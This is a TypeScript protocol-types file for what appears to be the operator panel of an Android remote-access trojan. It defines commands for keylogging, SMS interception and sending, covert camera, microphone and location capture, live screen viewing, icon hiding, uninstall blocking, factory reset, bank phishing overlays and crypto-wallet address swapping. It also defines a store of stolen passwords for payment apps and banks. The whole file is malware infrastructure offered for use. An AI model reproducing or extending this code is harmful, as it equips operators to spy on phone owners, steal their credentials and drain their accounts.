// WebSocket Protocol Types for Device Control

// Connection states
export type ConnectionState = 'connecting' | 'connected' | 'disconnected' | 'reconnecting';

// ============================================
// Outbound Messages (Panel → Server)
// ============================================

export interface JoinMessage {
  itype: 'slr_panel';
  subc: 'join';
  pid: string;
  usercheck: string;
}

export interface PingMessage {
  itype: 'slr_panel';
  subc: 'ping';
  pid: string;
}

export interface OutMessage {
  itype: 'slr_panel';
  subc: 'out';
  pid: string;
}

export interface DisagMessage {
  itype: 'slr_panel';
  subc: 'disag';
  pid: string;
}

export interface ScreenControlMessage {
  itype: 'slr_panel';
  subc: 'screen';
  pid: string;
  comand: 'nav' | 'mov' | 'L' | 'vol' | 'kb' | 'paste' | 'block' | 'blockd' | 'snap' | 'q' | 'phonepass' | 'usdt' | 'usdtadress';
  navshort?: 'ho' | 'bak' | 'rec';
  movetype?: '0' | '1' | '2';
  poi?: string | { x: number; y: number };
  lockit?: '0' | '1' | '2' | '3';
  volstate?: '0' | '1';
  kbstate?: '2' | '3';
  txt?: string;
  bstate?: '0' | '1' | '2' | '3';
  color?: string;
  blocktext?: string;
  stype?: '0' | '1';
  newqulity?: string;
  passtype?: string;
  usdttype?: string;
  usdtadresstext?: string;
  usercheck?: string;
}

export interface BroadcastMessage {
  itype: 'slr_panel';
  subc: 'bc';
  pid: string;
  comand: 'alert' | 'notify';
  title: string;
  msg: string;
  todo?: string;
  act: 'nothing' | 'openApp' | 'openLink';
  alertico?: string;
}

export interface FetchMessage {
  itype: 'slr_panel';
  subc: 'fetch';
  pid: string;
  ftype: string;
  fpath?: string;
}

export interface SearchMessage {
  itype: 'slr_panel';
  subc: 'srch';
  pid: string;
  srchfor: string;
  srchin: 'G' | 'S';
  targetpath?: string;
}

export interface CopyCutMessage {
  itype: 'slr_panel';
  subc: 'cocu';
  pid: string;
  state: 'co' | 'cu';
  tp: string;
  fp: string;
}

export interface ChatMessage {
  itype: 'slr_panel';
  subc: 'chat';
  pid: string;
  msg: string;
  title: string;
}

export interface ProxyMessage {
  itype: 'slr_panel';
  subc: 'proxy';
  pid: string;
  prxcom: 'ON' | 'OFF';
}

export interface BrowserMessage {
  itype: 'slr_panel';
  subc: 'brows';
  pid: string;
  btype: 'h' | 'n';
  bcom?: '0' | '1' | '3';
  ltype?: 'f' | 'u';
  extdata?: string;
}

export interface CheckPhoneMessage {
  subc: 'checkphone';
  email: string;
  page: number;
  pageSize: number;
  filters?: {
    user_email?: string;
    phone_name?: string;
    country?: string;
    model?: string;
    accessibility?: string;
    install_date?: string;
  };
}

export interface SubscribeMessage {
  subc: 'subscribe';
  email: string;
}

// Data request messages (slr_panelsend)
export interface DataRequestMessage {
  itype: 'slr_panelsend';
  subc:
  | 'SMS' | 'SMSSEND' | 'Contacts'
  | 'files' | 'changefiles' | 'viewfile'
  | 'LOADAPPS' | 'OPENAPP' | 'UNINSTALLAPP' | 'OPENINJ' | 'noinj'
  | 'Keylog' | 'Logdate'
  | 'screen' | 'display'
  | 'cam' | 'camoff' | 'mic' | 'micoff'
  | 'loc' | 'locoff'
  | 'rename' | 'change' | 'Hideico' | 'delete' | 'Notify'
  | 'Permissions' | 'DIAO'
  | 'activz' | 'notifys' | 'vapps' | 'vlinks'
  // Quick actions
  | 'wake' | 'mute' | 'unmute' | 'openapp'
  // Security controls
  | 'preventuninstall' | 'allowuninstall'
  | 'blackscreen' | 'unblackscreen' | 'preventtouch' | 'allowtouch'
  // Phishing
  | 'phish' | 'bankphish' | 'blocktext'
  // Gallery & files
  | 'getinject' | 'getgallery' | 'downloadfile' | 'deletefile'
  // Device control
  | 'restart' | 'factoryreset' | 'cleardata' | 'playaudio' | 'makecall' | 'getwifi'
  | 'join' | 'subscribe';
  pid: string;
  // SMS
  smsnumber?: string;
  message?: string;
  // Files
  filepath?: string;
  comdtype?: 'U' | 'R' | 'D';
  filetype?: 'fo' | 'fi';
  filename?: string;
  size?: number;
  content?: string;
  isinjct?: string;
  jctid?: string;
  // Screen - SM: 截图, SN: 投屏, SK: 文字识别
  screentype?: 'SM' | 'SMOFF' | 'SN' | 'SNOFF' | 'SK' | 'SKOFF';
  display?: string;
  // Camera
  SelectedCam?: 'front' | 'back';
  // Keylog
  keylogtype?: '0' | '1';
  keylogdate?: string;
  // Rename
  nam?: string;
  // Change
  domain?: string;
  ip?: string;
  changeid?: string;
  // Notify
  noti?: string;
  // Permissions
  prim?: string;
  // DIAO
  pin?: string;
  title?: string;
  lckdis?: string;
  typ?: string;
  // Activity
  kdate?: string;
  usercheck?: string;
  // Quick app / Open app
  appname?: string;
  packageName?: string;
  // Phishing
  ptype?: string;
  bank?: string;
  // Block text
  text?: string;
  bg?: string;
  // Path for download/delete
  path?: string;
}

export type WebSocketOutboundMessage =
  | JoinMessage
  | PingMessage
  | OutMessage
  | DisagMessage
  | ScreenControlMessage
  | BroadcastMessage
  | FetchMessage
  | SearchMessage
  | CopyCutMessage
  | ChatMessage
  | ProxyMessage
  | BrowserMessage
  | DataRequestMessage
  | CheckPhoneMessage
  | SubscribeMessage;

// ============================================
// Inbound Messages (Server → Panel)
// ============================================

export interface ScreenDataMessage {
  type: 'screen';
  data: string; // Base64 JPEG
  wmob: number;
  hmob: number;
  pid: string;
}

export interface ScreenshotDataMessage {
  type: 'screenshot';
  data: string; // Base64 JPEG
  wmob: number;
  hmob: number;
  pid: string;
}

export interface StatusBatchMessage {
  type: 'statusBatch';
  pid: string;
  lastPing: string | null;
  serverToPhone: number | string;
  phoneInfo: PhoneInfo;
  // passwords 数据包含在 phoneInfo.phone_password 中，由前端解析
}

export interface JoinResponseMessage {
  type: 'joinResponse';
  pid: string;
  is_online: boolean;
  serverToPhone: string;
  lastPing: string | null;
  phoneInfo: PhoneInfo;
  // passwords 数据包含在 phoneInfo.phone_password 中，由前端解析
}

export interface DeviceUpdateMessage {
  type: 'deviceUpdate';
  pid: string;
  phoneInfo: PhoneInfo;
  // passwords 数据包含在 phoneInfo.phone_password 中，由前端解析
}

export interface SmsDataMessage {
  type: 'sms';
  data: string; // Newline-delimited JSON
  pid: string;
}

export interface ContactsDataMessage {
  type: 'loadcontacts';
  data: string;
  pid: string;
}

export interface FilesDataMessage {
  type: 'files';
  data: string; // [>A<] and [>D<] delimited
  pid: string;
}

export interface SaveFilesDataMessage {
  type: 'savefiles';
  data: string; // JSON with fileName and fileContent
  pid: string;
}

export interface AppsDataMessage {
  type: 'loadapps';
  data: string; // JSON with apps array
  pid: string;
}

export interface InjAppsDataMessage {
  type: 'injapps';
  data: string;
  pid: string;
}

export interface KeylogDataMessage {
  type: 'klog';
  data: string;
  pid: string;
}

export interface KeylogDateDataMessage {
  type: 'klogsdate';
  data: string;
  pid: string;
}

export interface CameraDataMessage {
  type: 'cam';
  data: string; // Base64 JPEG
  pid: string;
}

export interface MicDataMessage {
  type: 'mic';
  data: string; // Base64 WAV
  pid: string;
}

export interface LocationDataMessage {
  type: 'loc';
  data: string;
  pid: string;
}

export interface SnapDataMessage {
  type: 'snap';
  data: string;
  pid: string;
}

export interface ThumbDataMessage {
  type: 'thumb';
  data: string;
  path: string;
  pid: string;
}

export interface SearchResultMessage {
  type: 'srch';
  data: string;
  sfor: string;
  pid: string;
}

export interface DownloadDataMessage {
  type: 'down';
  filename: string;
  filedata: string;
  totalSize: number;
  sentSize: number;
  chunkNumber: number;
  filehash: string;
  filepath: string;
  pid: string;
}

export interface ProxyDataMessage {
  type: 'proxy';
  pid: string;
  calltype: 'first' | 'state' | 'dataup';
  extip?: string;
  locip?: string;
  pxport?: string;
  pstate?: string;
  ogip?: string;
  pxip?: string;
  purl?: string;
  pmthod?: string;
}

export interface NotifyMessage {
  type: 'notify';
  pid: string;
  meth: string;
  data: string;
}

export interface ChatDataMessage {
  type: 'chat';
  data: string;
  pid: string;
}

export interface CheckPhoneDevice {
  phone_id: string;
  phone_name: string;
  model: string;
  android_version: string;
  battery_charge: string;
  accessibility: '0' | '1';
  country: string;
  user_email: string;
  install_date: string;
  lastPing?: number;
  is_online?: boolean;
}

export interface CheckPhoneResponse {
  type: 'checkphone';
  list: CheckPhoneDevice[];
  total: number;
  pageCount: number;
  page: number;
  pageSize: number;
  fileLastModified?: string;
}

// Device stats
export interface DeviceStats {
  total: number;
  online: number;
  offline: number;
}

// Subscribe response (Server → Panel)
export interface SubscribeResponse {
  type: 'subscribe';
  success: boolean;
  isAdmin?: boolean;
  error?: string;
}

// Device status push messages (Server → Panel)
export interface DeviceOnlineMessage {
  type: 'deviceOnline';
  pid: string;
  phoneInfo: PhoneInfo;
  stats?: DeviceStats;
}

export interface DeviceOfflineMessage {
  type: 'deviceOffline';
  pid: string;
  phoneInfo: null;
  stats?: DeviceStats;
}

export type WebSocketInboundMessage =
  | ScreenDataMessage
  | ScreenshotDataMessage
  | StatusBatchMessage
  | JoinResponseMessage
  | DeviceUpdateMessage
  | SmsDataMessage
  | ContactsDataMessage
  | FilesDataMessage
  | SaveFilesDataMessage
  | AppsDataMessage
  | InjAppsDataMessage
  | KeylogDataMessage
  | KeylogDateDataMessage
  | CameraDataMessage
  | MicDataMessage
  | LocationDataMessage
  | SnapDataMessage
  | ThumbDataMessage
  | SearchResultMessage
  | DownloadDataMessage
  | ProxyDataMessage
  | NotifyMessage
  | ChatDataMessage
  | CheckPhoneResponse
  | SubscribeResponse
  | DeviceOnlineMessage
  | DeviceOfflineMessage;

// ============================================
// Phone Info from statusBatch
// ============================================

export interface PhoneInfo {
  pid?: string;
  phone_id?: string;
  phone_name?: string;
  model?: string;
  android_version?: string;
  battery_charge?: string;
  accessibility?: '0' | '1' | string;
  country?: string;
  user_email?: string;
  install_date?: string;
  keylogs?: string;
  phone_password?: string;
  display?: string;
  activz?: string;
  lastPing?: number;
  is_online?: boolean;
  phone?: string;
  ip?: string;
  ip_location?: string;
  has_password?: string;
  network?: string;
  wallpap?: string;
}

// ============================================
// Device Status
// ============================================

export interface PasswordData {
  phone?: string;
  phish?: string;
  alipay?: string;
  wechat?: string;
  yun?: string;
  jian?: string;
  you?: string;
  nong?: string;
  zhong?: string;
  gong?: string;
  zhao?: string;
  gpay?: string;
  phonepe?: string;
  bc?: string;
  mb?: string;
}

export interface DeviceStatus {
  lastPing: string;
  connectionStatus: string;
  phoneInfo: PhoneInfo | null;
  // passwords 数据包含在 phoneInfo.phone_password 中，由前端解析
}
